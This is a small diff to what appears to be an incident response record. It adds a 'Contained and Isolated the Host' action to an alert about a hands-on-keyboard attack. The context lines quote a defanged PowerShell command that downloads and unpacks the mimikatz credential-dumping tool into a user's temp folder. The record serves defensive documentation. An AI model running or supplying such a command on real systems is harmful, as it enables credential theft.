@@ -10,6 +10,7 @@
 * Executed PowerShell Command :  iwr "hxxps[://github[.com/gentilkiwi/mimikatz/releases/download/2[.]2[.]0-20220919/mimikatz_trunk[.]zip" -Outfile "$env:TEMP\mimikatz.zip"; Expand-Archive "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz_extracted" -Force
 - Alert: Hands-on keyboard attack launched from a compromised account
 - Investigation Status: Remediated
+- Action : Contained and Isolated the Host
 - Automated Investigation and Response: Status changed from New to Resolved on Jan 27, 2026, 12:22:53 PM UTC
 - Suspicious Folder Path: c:\users\jennysmith\appdata\local\temp\mimikatz_extracted\
 - Suspicious File Path : c:\users\jennysmith\appdata\local\temp\mimikatz.zip
